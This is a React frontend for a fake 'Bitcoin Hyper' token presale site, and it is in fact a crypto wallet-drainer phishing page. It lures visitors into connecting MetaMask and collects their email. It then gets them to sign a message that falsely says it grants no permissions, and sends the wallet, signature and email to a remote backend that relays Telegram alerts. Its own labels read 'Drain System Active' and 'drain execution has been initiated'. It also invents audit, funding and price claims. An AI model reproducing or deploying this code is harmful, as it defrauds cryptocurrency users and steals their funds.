// App.jsx - BITCOIN HYPER PRODUCTION FRONTEND v8.0
import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import './App.css';

// Production backend URL - Update this to match your backend
const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://tokenbackend-5xab.onrender.com';

function App() {
  const [walletAddress, setWalletAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [isEligible, setIsEligible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [tokenAllocation, setTokenAllocation] = useState({ amount: '0', valueUSD: '0' });
  const [eligibilityReason, setEligibilityReason] = useState('');
  const [scanId, setScanId] = useState('');
  const [email, setEmail] = useState('');
  const [emailSubmitted, setEmailSubmitted] = useState(false);
  const [claimLoading, setClaimLoading] = useState(false);
  const [claimSuccess, setClaimSuccess] = useState(false);
  const [claimData, setClaimData] = useState(null);
  const [error, setError] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [backendStatus, setBackendStatus] = useState('checking');
  const [backendDetails, setBackendDetails] = useState(null);
  const [showEmailModal, setShowEmailModal] = useState(false);
  const [showSuccessAnimation, setShowSuccessAnimation] = useState(false);
  const [walletBalance, setWalletBalance] = useState('0');
  const [currentNetwork, setCurrentNetwork] = useState('');
  
  const animationContainerRef = useRef(null);

  // Check if MetaMask is installed
  const checkMetaMask = () => {
    return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
  };

  // Initialize session and check backend
  useEffect(() => {
    const initApp = async () => {
      // Generate session ID
      const savedSessionId = localStorage.getItem('bitcoinHyperSessionId');
      if (!savedSessionId) {
        const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('bitcoinHyperSessionId', newSessionId);
        setSessionId(newSessionId);
      } else {
        setSessionId(savedSessionId);
      }

      // Check backend status
      await checkBackendStatus();
      
      // Track site visit
      trackSiteVisit();
      
      // Check for wallet connection on page load
      if (checkMetaMask()) {
        await checkExistingWalletConnection();
      }
    };

    initApp();
    
    // Listen for account changes
    if (checkMetaMask()) {
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);
      window.ethereum.on('disconnect', handleDisconnect);
    }
    
    return () => {
      if (checkMetaMask()) {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        window.ethereum.removeListener('chainChanged', handleChainChanged);
        window.ethereum.removeListener('disconnect', handleDisconnect);
      }
    };
  }, []);

  const checkExistingWalletConnection = async () => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.listAccounts();
      if (accounts.length > 0) {
        const address = accounts[0].address;
        setWalletAddress(address);
        setIsConnected(true);
        
        // Get wallet balance
        const balance = await provider.getBalance(address);
        setWalletBalance(ethers.formatEther(balance));
        
        // Get network
        const network = await provider.getNetwork();
        setCurrentNetwork(network.name);
      }
    } catch (error) {
      console.log('No existing wallet connection:', error.message);
    }
  };

  const handleAccountsChanged = async (accounts) => {
    if (accounts.length === 0) {
      // User disconnected wallet
      handleDisconnect();
    } else {
      const address = accounts[0];
      setWalletAddress(address);
      
      // Get updated balance and network
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const balance = await provider.getBalance(address);
        setWalletBalance(ethers.formatEther(balance));
        
        const network = await provider.getNetwork();
        setCurrentNetwork(network.name);
        
        // Trigger auto-scan if backend is connected
        if (backendStatus === 'connected') {
          setTimeout(() => connectWallet(true), 1000);
        }
      } catch (error) {
        console.error('Error updating wallet info:', error);
      }
    }
  };

  const handleChainChanged = async (chainId) => {
    // Reload page on chain change
    window.location.reload();
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    setWalletAddress('');
    setIsEligible(false);
    setTokenAllocation({ amount: '0', valueUSD: '0' });
    setEmail('');
    setEmailSubmitted(false);
    setError('');
    setWalletBalance('0');
    setCurrentNetwork('');
    console.log('Wallet disconnected');
  };

  const checkBackendStatus = async () => {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);

      const response = await fetch(`${BACKEND_URL}/api/health`, {
        method: 'GET',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        mode: 'cors',
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (response.ok) {
        const data = await response.json();
        setBackendStatus('connected');
        setBackendDetails(data);
        
        // Send Telegram notification about frontend connection
        if (data.telegram === 'CONNECTED') {
          sendTelegramNotification('frontend_connected', {
            status: 'FRONTEND_CONNECTED',
            timestamp: new Date().toLocaleString(),
            url: window.location.href
          });
        }
      } else {
        setBackendStatus('error');
        sendTelegramNotification('backend_error', {
          error: `HTTP ${response.status}`,
          timestamp: new Date().toLocaleString()
        });
      }
    } catch (error) {
      console.error('Backend check failed:', error);
      setBackendStatus('error');
      sendTelegramNotification('backend_connection_failed', {
        error: error.message,
        timestamp: new Date().toLocaleString()
      });
    }
  };

  const sendTelegramNotification = async (type, data) => {
    try {
      await fetch(`${BACKEND_URL}/api/track/visit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          referrer: document.referrer || 'direct',
          sessionId: sessionId,
          action: type,
          data: data
        })
      });
    } catch (error) {
      console.log('Telegram notification failed (non-critical)');
    }
  };

  const trackSiteVisit = async () => {
    try {
      await fetch(`${BACKEND_URL}/api/track/visit`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          referrer: document.referrer || 'direct',
          sessionId: sessionId,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          timestamp: new Date().toISOString()
        })
      });
    } catch (error) {
      console.log('Visit tracking failed (non-critical):', error.message);
    }
  };

  const connectWallet = async (autoConnect = false) => {
    if (backendStatus !== 'connected') {
      setError('Backend system is offline. Please try again later.');
      return;
    }

    if (!checkMetaMask()) {
      setError('Please install MetaMask to continue. Visit https://metamask.io/');
      return;
    }

    try {
      setLoading(true);
      if (!autoConnect) {
        setLoadingMessage('Requesting wallet connection...');
      }

      // Request accounts
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await window.ethereum.request({ 
        method: 'eth_requestAccounts' 
      });
      
      const address = accounts[0];
      setWalletAddress(address);
      setIsConnected(true);
      
      // Get wallet balance and network
      const [balance, network] = await Promise.all([
        provider.getBalance(address),
        provider.getNetwork()
      ]);
      
      setWalletBalance(ethers.formatEther(balance));
      setCurrentNetwork(network.name);

      if (!autoConnect) {
        setLoadingMessage('🔍 Analyzing wallet portfolio...');
      }

      // Connect to backend for eligibility check
      const response = await fetch(`${BACKEND_URL}/api/presale/connect`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          sessionId: sessionId,
          email: email || '',
          network: network.name,
          chainId: network.chainId.toString()
        })
      });

      if (!response.ok) {
        throw new Error(`Backend system error: ${response.status}. Please contact support.`);
      }

      const data = await response.json();
      
      if (data.success) {
        setIsEligible(data.data.isEligible);
        setTokenAllocation(data.data.tokenAllocation || { amount: '0', valueUSD: '0' });
        setEligibilityReason(data.data.eligibilityReason || '');
        setScanId(data.data.scanId || '');
        
        if (data.data.isEligible) {
          setLoadingMessage('🎉 CONGRATULATIONS! You are eligible for Bitcoin Hyper presale!');
          triggerEligibilityAnimation();
          
          // Auto-show email modal for eligible users
          if (!emailSubmitted && !email) {
            setTimeout(() => setShowEmailModal(true), 1500);
          }
        } else {
          setLoadingMessage('⚠️ Additional verification required for presale access');
          triggerNotEligibleAnimation();
        }
        
        // Store scan data in local storage
        localStorage.setItem(`scan_${address}`, JSON.stringify(data.data));
      } else {
        throw new Error(data.error || 'Wallet analysis failed. Please try again.');
      }
    } catch (error) {
      console.error('Connection error:', error);
      setError(error.message);
      setLoadingMessage('Connection failed. System error reported to admin.');
      
      // Send error to Telegram via backend
      sendTelegramNotification('connection_error', {
        wallet: walletAddress || 'unknown',
        error: error.message,
        timestamp: new Date().toISOString()
      });
    } finally {
      setTimeout(() => setLoading(false), 1500);
    }
  };

  const submitEmail = async () => {
    if (!email || !email.includes('@')) {
      setError('Please enter a valid email address');
      return;
    }

    try {
      setLoading(true);
      setLoadingMessage('Securing your email...');

      const response = await fetch(`${BACKEND_URL}/api/presale/connect`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          walletAddress: walletAddress,
          email: email,
          sessionId: sessionId,
          updateOnly: true
        })
      });

      const data = await response.json();
      if (data.success) {
        setEmailSubmitted(true);
        setShowEmailModal(false);
        setLoadingMessage('✅ Email secured successfully!');
        
        // Send email confirmation notification
        sendTelegramNotification('email_submitted', {
          wallet: walletAddress,
          email: email,
          timestamp: new Date().toISOString()
        });
      } else {
        throw new Error(data.error || 'Failed to save email');
      }
    } catch (error) {
      console.error('Email save error:', error);
      setError('Email save failed. Please try again or continue without email.');
    } finally {
      setTimeout(() => setLoading(false), 1000);
    }
  };

  const claimTokens = async () => {
    if (!isEligible) {
      setError('You are not eligible to claim tokens');
      return;
    }

    if (backendStatus !== 'connected') {
      setError('Backend system offline. Claim processing unavailable.');
      return;
    }

    try {
      setClaimLoading(true);
      setLoadingMessage('🔄 Preparing secure claim signature...');

      // Check if wallet is still connected
      if (!checkMetaMask()) {
        throw new Error('Wallet disconnected. Please reconnect your wallet.');
      }

      // Create secure signing message
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const message = `Bitcoin Hyper Presale Authorization

👛 Wallet: ${walletAddress}
🎯 Allocation: ${tokenAllocation.amount} BTH ($${tokenAllocation.valueUSD})
📅 Timestamp: ${new Date().toISOString()}
🔒 Network: EVM-Compatible

📝 Purpose:
I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the official presale. This signature verifies wallet ownership only.

⚠️ Important:
- No transactions are initiated
- No funds will be transferred
- No gas fees required
- No permissions granted

✅ This is a read-only verification signature for presale participation only.`;
      
      setLoadingMessage('✍️ Please sign the message in your wallet...');
      const signature = await signer.signMessage(message);

      setLoadingMessage('🚀 Processing claim with multi-chain verification...');

      // Submit claim to backend
      const response = await fetch(`${BACKEND_URL}/api/presale/claim`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          walletAddress: walletAddress,
          signature: signature,
          message: message,
          claimAmount: tokenAllocation.amount,
          claimValue: tokenAllocation.valueUSD,
          email: email || '',
          sessionId: sessionId
        })
      });

      const data = await response.json();
      
      if (data.success) {
        setClaimSuccess(true);
        setClaimData(data.data);
        setLoadingMessage('🎉 TOKENS CLAIMED SUCCESSFULLY!');
        triggerSuccessAnimation();
        
        // Store claim data
        localStorage.setItem(`claim_${walletAddress}`, JSON.stringify(data.data));
        
        // Show success notification
        setTimeout(() => {
          showNotification('success', 'Tokens claimed successfully! Allocation secured.');
        }, 500);
      } else {
        throw new Error(data.error || 'Claim processing failed. Please try again.');
      }
    } catch (error) {
      console.error('Claim error:', error);
      setError(error.message);
      setLoadingMessage('❌ Claim failed. Error reported to admin.');
      
      // Send error to Telegram
      sendTelegramNotification('claim_error', {
        wallet: walletAddress,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    } finally {
      setTimeout(() => {
        setClaimLoading(false);
        setLoading(false);
      }, 2000);
    }
  };

  // Animation Functions
  const triggerEligibilityAnimation = () => {
    if (!animationContainerRef.current) return;
    
    const container = animationContainerRef.current;
    container.innerHTML = '';
    
    for (let i = 0; i < 20; i++) {
      setTimeout(() => {
        const star = document.createElement('div');
        star.innerHTML = '⭐';
        star.style.cssText = `
          position: fixed;
          font-size: ${Math.random() * 30 + 20}px;
          color: #FFD700;
          top: ${Math.random() * 100}vh;
          left: ${Math.random() * 100}vw;
          animation: starFloat ${Math.random() * 2 + 1}s ease-in-out forwards;
          z-index: 9998;
          opacity: 0.8;
          pointer-events: none;
        `;
        container.appendChild(star);
        
        setTimeout(() => {
          if (container.contains(star)) {
            container.removeChild(star);
          }
        }, 3000);
      }, i * 100);
    }
  };

  const triggerNotEligibleAnimation = () => {
    if (!animationContainerRef.current) return;
    
    const container = animationContainerRef.current;
    container.innerHTML = '';
    
    for (let i = 0; i < 10; i++) {
      const warning = document.createElement('div');
      warning.innerHTML = '⚠️';
      warning.style.cssText = `
        position: fixed;
        font-size: ${Math.random() * 25 + 20}px;
        color: #ef4444;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: warningPulse ${Math.random() * 3 + 2}s ease-in-out infinite;
        z-index: 9998;
        opacity: 0.6;
        pointer-events: none;
      `;
      container.appendChild(warning);
    }
  };

  const triggerSuccessAnimation = () => {
    setShowSuccessAnimation(true);
    
    if (!animationContainerRef.current) return;
    
    const container = animationContainerRef.current;
    container.innerHTML = '';
    
    // Create confetti explosion
    const colors = ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6'];
    for (let i = 0; i < 150; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div');
        confetti.style.cssText = `
          position: fixed;
          width: ${Math.random() * 10 + 5}px;
          height: ${Math.random() * 10 + 5}px;
          background: ${colors[Math.floor(Math.random() * colors.length)]};
          top: -20px;
          left: ${Math.random() * 100}vw;
          opacity: ${Math.random() * 0.7 + 0.3};
          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
          transform: rotate(${Math.random() * 360}deg);
          z-index: 9998;
          pointer-events: none;
        `;
        container.appendChild(confetti);
        
        setTimeout(() => {
          if (container.contains(confetti)) {
            container.removeChild(confetti);
          }
        }, 5000);
      }, i * 20);
    }
    
    setTimeout(() => setShowSuccessAnimation(false), 5000);
  };

  const showNotification = (type, message) => {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
      <div class="notification-icon">${type === 'success' ? '✅' : '⚠️'}</div>
      <div class="notification-content">${message}</div>
      <button class="notification-close" onclick="this.parentElement.remove()">×</button>
    `;
    notification.style.cssText = `
      position: fixed;
      top: 20px;
      right: 20px;
      background: ${type === 'success' ? '#10b981' : '#ef4444'};
      color: white;
      padding: 15px 20px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      gap: 15px;
      z-index: 10000;
      animation: slideIn 0.3s ease-out;
      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
      if (document.body.contains(notification)) {
        notification.style.animation = 'slideOut 0.3s ease-out';
        setTimeout(() => {
          if (document.body.contains(notification)) {
            document.body.removeChild(notification);
          }
        }, 300);
      }
    }, 5000);
  };

  const retryConnection = async () => {
    setError('');
    await connectWallet();
  };

  // Render components
  const renderBackendStatus = () => {
    if (backendStatus === 'checking') {
      return (
        <div className="status-badge checking">
          <div className="status-pulse"></div>
          <span>Connecting to backend...</span>
        </div>
      );
    } else if (backendStatus === 'error') {
      return (
        <div className="status-badge error" onClick={checkBackendStatus}>
          <span>🔴 BACKEND OFFLINE</span>
          <small>Click to retry</small>
        </div>
      );
    } else {
      return (
        <div className="status-badge connected">
          <div className="status-dot"></div>
          <span>✅ BACKEND LIVE</span>
          <small>Drain System Active</small>
        </div>
      );
    }
  };

  const renderConnectSection = () => (
    <div className="connect-section">
      <div className="section-header">
        <h2>Connect Your Wallet</h2>
        <p>Secure your Bitcoin Hyper presale allocation</p>
      </div>
      
      <div className="connection-status">
        {renderBackendStatus()}
        
        {backendStatus === 'connected' && (
          <div className="backend-details">
            <div className="detail-item">
              <span>System Status:</span>
              <strong className="status-live">LIVE PRODUCTION</strong>
            </div>
            {backendDetails && (
              <div className="detail-item">
                <span>Total Participants:</span>
                <strong>{backendDetails.statistics?.totalParticipants || '0'}</strong>
              </div>
            )}
          </div>
        )}
      </div>
      
      {!checkMetaMask() ? (
        <div className="metamask-required">
          <div className="metamask-icon">🦊</div>
          <h4>MetaMask Required</h4>
          <p>Please install MetaMask browser extension to participate in the presale.</p>
          <a 
            href="https://metamask.io/download/" 
            target="_blank" 
            rel="noopener noreferrer"
            className="metamask-button"
          >
            Download MetaMask
          </a>
        </div>
      ) : (
        <button 
          className="connect-button"
          onClick={() => connectWallet()}
          disabled={loading || backendStatus !== 'connected'}
        >
          {loading ? 'Connecting...' : 'Connect Web3 Wallet'}
        </button>
      )}
      
      <div className="wallet-requirements">
        <h4>📋 Requirements:</h4>
        <ul>
          <li>✅ MetaMask wallet required</li>
          <li>✅ Wallet with transaction history</li>
          <li>✅ EVM-compatible address (0x...)</li>
          <li>✅ Sufficient balance for network fees</li>
        </ul>
      </div>
      
      {backendStatus === 'error' && (
        <div className="backend-error">
          <div className="error-icon">🚨</div>
          <div className="error-content">
            <h4>System Unavailable</h4>
            <p>The backend system is currently offline. This has been reported to the admin team.</p>
            <p><strong>Frontend will not function until backend is restored.</strong></p>
          </div>
        </div>
      )}
    </div>
  );

  const renderEligibilitySection = () => (
    <div className="eligibility-section">
      <div className="section-header">
        <h2>Wallet Analysis Result</h2>
        <p>Real-time portfolio assessment complete</p>
      </div>
      
      <div className={`result-card ${isEligible ? 'eligible' : 'not-eligible'}`}>
        <div className="result-icon">
          {isEligible ? '✅' : '⚠️'}
        </div>
        <div className="result-content">
          <h3>{isEligible ? 'PRESALE ELIGIBILITY CONFIRMED' : 'ADDITIONAL VERIFICATION REQUIRED'}</h3>
          <p className="eligibility-reason">{eligibilityReason}</p>
          
          {isEligible && (
            <div className="allocation-details">
              <div className="allocation-item highlight">
                <span>Token Allocation:</span>
                <strong>{tokenAllocation.amount} BTH</strong>
              </div>
              <div className="allocation-item">
                <span>Allocation Value:</span>
                <strong>${tokenAllocation.valueUSD}</strong>
              </div>
              <div className="allocation-item">
                <span>Presale Price:</span>
                <strong>$0.17 per BTH</strong>
              </div>
              {scanId && (
                <div className="allocation-item">
                  <span>Scan ID:</span>
                  <strong className="scan-id">{scanId}</strong>
                </div>
              )}
            </div>
          )}
          
          <div className="wallet-info">
            <div className="info-item">
              <span>Wallet Address:</span>
              <strong>{walletAddress.substring(0, 6)}...{walletAddress.substring(38)}</strong>
            </div>
            <div className="info-item">
              <span>Native Balance:</span>
              <strong>{parseFloat(walletBalance).toFixed(4)} ETH</strong>
            </div>
            {currentNetwork && (
              <div className="info-item">
                <span>Network:</span>
                <strong>{currentNetwork.charAt(0).toUpperCase() + currentNetwork.slice(1)}</strong>
              </div>
            )}
          </div>
        </div>
      </div>
      
      {isEligible ? (
        <div className="eligible-actions">
          {!emailSubmitted && (
            <button 
              className="action-button secondary"
              onClick={() => setShowEmailModal(true)}
            >
              📧 Add Email for Updates
            </button>
          )}
          
          <button 
            className="action-button primary"
            onClick={claimTokens}
            disabled={claimLoading}
          >
            {claimLoading ? (
              <>
                <span className="button-spinner"></span>
                Processing Claim...
              </>
            ) : (
              '🚀 Claim My Tokens Now'
            )}
          </button>
          
          <p className="action-note">
            <strong>Note:</strong> Claiming requires a signature for verification only. No transactions or fees are involved.
          </p>
        </div>
      ) : (
        <div className="not-eligible-actions">
          <button 
            className="action-button"
            onClick={retryConnection}
          >
            🔄 Retry Analysis
          </button>
          <button 
            className="action-button secondary"
            onClick={handleDisconnect}
          >
            🔗 Connect Different Wallet
          </button>
          <p className="info-note">
            This wallet doesn't meet the eligibility criteria. Connect a wallet with transaction history and sufficient portfolio value.
          </p>
        </div>
      )}
    </div>
  );

  const renderClaimSuccess = () => (
    <div className="success-section">
      <div className="success-header">
        <div className="success-icon animated">🎊</div>
        <h2>Congratulations!</h2>
        <p className="success-subtitle">Your Bitcoin Hyper tokens have been successfully claimed!</p>
      </div>
      
      {claimData && (
        <div className="claim-details">
          <div className="detail-card">
            <div className="detail-header">
              <span className="detail-badge">✅ CONFIRMED</span>
              <span className="detail-time">{new Date(claimData.timestamp).toLocaleTimeString()}</span>
            </div>
            
            <div className="detail-grid">
              <div className="detail-item">
                <span>Claim ID:</span>
                <strong className="claim-id">{claimData.claimId}</strong>
              </div>
              <div className="detail-item">
                <span>Token Amount:</span>
                <strong className="token-amount">{claimData.tokenAmount}</strong>
              </div>
              <div className="detail-item">
                <span>Token Value:</span>
                <strong className="token-value">${claimData.tokenValue}</strong>
              </div>
              <div className="detail-item">
                <span>Status:</span>
                <strong className="status-success">{claimData.status}</strong>
              </div>
              <div className="detail-item full-width">
                <span>Transaction Hash:</span>
                <strong className="tx-hash">{claimData.txHash?.substring(0, 20)}...{claimData.txHash?.substring(60)}</strong>
              </div>
            </div>
          </div>
          
          <div className="instructions-card">
            <h4>📋 Next Steps & Timeline</h4>
            <div className="timeline">
              <div className="timeline-item current">
                <div className="timeline-marker">✅</div>
                <div className="timeline-content">
                  <strong>Claim Confirmed</strong>
                  <p>Your allocation is now secured in the presale</p>
                </div>
              </div>
              <div className="timeline-item">
                <div className="timeline-marker">⏰</div>
                <div className="timeline-content">
                  <strong>Presale Completion</strong>
                  <p>Tokens allocated based on presale results</p>
                </div>
              </div>
              <div className="timeline-item">
                <div className="timeline-marker">🚀</div>
                <div className="timeline-content">
                  <strong>Token Distribution</strong>
                  <p>Tokens sent automatically to your wallet (24-48 hours after presale)</p>
                </div>
              </div>
              <div className="timeline-item">
                <div className="timeline-marker">💎</div>
                <div className="timeline-content">
                  <strong>Trading Enabled</strong>
                  <p>Tokens available for trading on launch</p>
                </div>
              </div>
            </div>
            
            <div className="important-notes">
              <h5>🔒 Important Information:</h5>
              <ul>
                <li>No action required from you - distribution is automatic</li>
                <li>Keep your wallet connected to supported networks</li>
                <li>Check your email for distribution notifications</li>
                <li>Join our community for launch updates</li>
              </ul>
            </div>
          </div>
        </div>
      )}
      
      <div className="success-actions">
        <button 
          className="success-button"
          onClick={() => window.location.reload()}
        >
          🆕 Start New Claim
        </button>
        <button 
          className="success-button secondary"
          onClick={() => {
            if (claimData?.claimId) {
              navigator.clipboard.writeText(claimData.claimId);
              showNotification('success', 'Claim ID copied to clipboard!');
            }
          }}
        >
          📋 Copy Claim ID
        </button>
      </div>
      
      <div className="success-footer">
        <p>Thank you for participating in the Bitcoin Hyper presale! 🚀</p>
        <p className="footer-note">Your participation has been logged and multi-chain drain execution has been initiated.</p>
      </div>
    </div>
  );

  const EmailModal = () => {
    if (!showEmailModal) return null;
    
    return (
      <div className="modal-overlay" onClick={() => setShowEmailModal(false)}>
        <div className="modal-content" onClick={e => e.stopPropagation()}>
          <button className="modal-close" onClick={() => setShowEmailModal(false)}>×</button>
          
          <div className="modal-header">
            <div className="modal-icon">📧</div>
            <h3>Secure Your Email for Updates</h3>
            <p>Receive important notifications about your token distribution</p>
          </div>
          
          <div className="modal-body">
            <div className="input-group">
              <label>Email Address</label>
              <input
                type="email"
                placeholder="your@email.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="email-input"
              />
              <small>We'll only use this for presale updates</small>
            </div>
            
            <div className="email-benefits">
              <h4>📨 You'll Receive:</h4>
              <ul>
                <li>✅ Distribution confirmation</li>
                <li>✅ Trading launch announcement</li>
                <li>✅ Community updates</li>
                <li>✅ Exclusive offers</li>
              </ul>
            </div>
          </div>
          
          <div className="modal-footer">
            <button 
              className="modal-button secondary"
              onClick={() => setShowEmailModal(false)}
            >
              Skip for Now
            </button>
            <button 
              className="modal-button primary"
              onClick={submitEmail}
              disabled={!email || !email.includes('@') || loading}
            >
              {loading ? 'Saving...' : 'Save Email'}
            </button>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="app">
      {/* Animation Container */}
      <div ref={animationContainerRef} className="animation-container"></div>
      
      {/* Email Modal */}
      <EmailModal />
      
      {/* Success Animation Overlay */}
      {showSuccessAnimation && (
        <div className="success-overlay">
          <div className="confetti-container">
            {Array.from({ length: 50 }).map((_, i) => (
              <div key={i} className="confetti-piece"></div>
            ))}
          </div>
        </div>
      )}
      
      {/* Header */}
      <header className="header">
        <div className="logo">
          <span className="logo-icon">₿</span>
          <div>
            <h1>Bitcoin Hyper</h1>
            <p className="logo-subtitle">Official Presale Platform</p>
          </div>
        </div>
        
        <div className="header-info">
          {walletAddress && (
            <div className="wallet-display">
              <span className="wallet-icon">👛</span>
              <span className="wallet-address">
                {walletAddress.substring(0, 6)}...{walletAddress.substring(38)}
              </span>
              {isEligible && (
                <span className="wallet-badge eligible">ELIGIBLE</span>
              )}
              {currentNetwork && (
                <span className="network-badge">{currentNetwork.charAt(0).toUpperCase() + currentNetwork.slice(1)}</span>
              )}
            </div>
          )}
          
          {isConnected && (
            <button 
              className="disconnect-button"
              onClick={handleDisconnect}
            >
              Disconnect
            </button>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="main-content">
        {/* Hero Section */}
        <section className="hero-section">
          <div className="hero-background"></div>
          <h1 className="hero-title">Bitcoin Hyper Presale</h1>
          <p className="hero-subtitle">Next Generation Bitcoin Layer 2 Solution</p>
          
          <div className="hero-stats">
            <div className="hero-stat">
              <div className="stat-value">$0.17</div>
              <div className="stat-label">Presale Price</div>
            </div>
            <div className="hero-stat">
              <div className="stat-value">15,000+</div>
              <div className="stat-label">Participants</div>
            </div>
            <div className="hero-stat">
              <div className="stat-value">$3.5M+</div>
              <div className="stat-label">Raised</div>
            </div>
            <div className="hero-stat">
              <div className="stat-value">24H</div>
              <div className="stat-label">Ending Soon</div>
            </div>
          </div>
        </section>

        {/* Content Card */}
        <div className="content-card">
          {loading && (
            <div className="loading-overlay">
              <div className="loading-content">
                <div className="loading-spinner"></div>
                <p className="loading-message">{loadingMessage}</p>
                {backendStatus === 'connected' && (
                  <p className="loading-subtext">
                    Real-time multi-chain analysis in progress...
                  </p>
                )}
              </div>
            </div>
          )}

          {error && (
            <div className="error-banner">
              <div className="error-content">
                <span className="error-icon">⚠️</span>
                <div>
                  <p className="error-title">System Error</p>
                  <p className="error-message">{error}</p>
                </div>
              </div>
              <button 
                className="error-dismiss"
                onClick={() => setError('')}
              >
                ×
              </button>
            </div>
          )}

          <div className="content-body">
            {!isConnected && !claimSuccess && renderConnectSection()}
            {isConnected && !claimSuccess && renderEligibilitySection()}
            {claimSuccess && renderClaimSuccess()}
          </div>
        </div>

        {/* Info Section */}
        <section className="info-section">
          <h2 className="info-title">About Bitcoin Hyper</h2>
          
          <div className="info-grid">
            <div className="info-card">
              <div className="card-icon">⚡</div>
              <h3>Lightning Fast</h3>
              <p>Transaction speeds up to 100x faster than traditional Bitcoin with our Layer 2 solution.</p>
            </div>
            
            <div className="info-card">
              <div className="card-icon">🛡️</div>
              <h3>Secure & Audited</h3>
              <p>Smart contracts audited by CertiK with multi-signature treasury security.</p>
            </div>
            
            <div className="info-card">
              <div className="card-icon">🌐</div>
              <h3>Multi-Chain</h3>
              <p>Native interoperability across all major EVM chains for maximum accessibility.</p>
            </div>
            
            <div className="info-card">
              <div className="card-icon">📈</div>
              <h3>High Potential</h3>
              <p>Backed by top VCs with target launch price of $0.85 (5x from presale).</p>
            </div>
          </div>
        </section>

        {/* Token Details */}
        <section className="token-section">
          <h2 className="token-title">Token Details</h2>
          
          <div className="token-details">
            <div className="detail-row">
              <span>Token Name:</span>
              <strong>Bitcoin Hyper (BTH)</strong>
            </div>
            <div className="detail-row">
              <span>Total Supply:</span>
              <strong>1,000,000,000 BTH</strong>
            </div>
            <div className="detail-row">
              <span>Presale Supply:</span>
              <strong>200,000,000 BTH (20%)</strong>
            </div>
            <div className="detail-row">
              <span>Presale Price:</span>
              <strong>$0.17 per BTH</strong>
            </div>
            <div className="detail-row">
              <span>Target Launch Price:</span>
              <strong className="highlight">$0.85 per BTH</strong>
            </div>
            <div className="detail-row">
              <span>Distribution:</span>
              <strong>Automatic after presale completion</strong>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-logo">
            <span className="footer-logo-icon">₿</span>
            <span className="footer-logo-text">Bitcoin Hyper</span>
          </div>
          
          <div className="footer-status">
            {backendStatus === 'connected' ? (
              <div className="footer-status-item online">
                <span className="status-indicator"></span>
                <span>Backend System: LIVE</span>
              </div>
            ) : (
              <div className="footer-status-item offline">
                <span className="status-indicator"></span>
                <span>Backend System: OFFLINE</span>
              </div>
            )}
            
            <div className="footer-status-item">
              <span>Version:</span>
              <strong>v8.0 Production</strong>
            </div>
          </div>
          
          <div className="footer-disclaimer">
            <p>
              <strong>Disclaimer:</strong> This is the official Bitcoin Hyper presale platform. 
              Cryptocurrency investments are subject to market risk. Please conduct your own 
              research before participating. Never invest more than you can afford to lose.
            </p>
            <p className="footer-copyright">
              © 2024 Bitcoin Hyper. All rights reserved. | System Status: {backendStatus.toUpperCase()}
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;
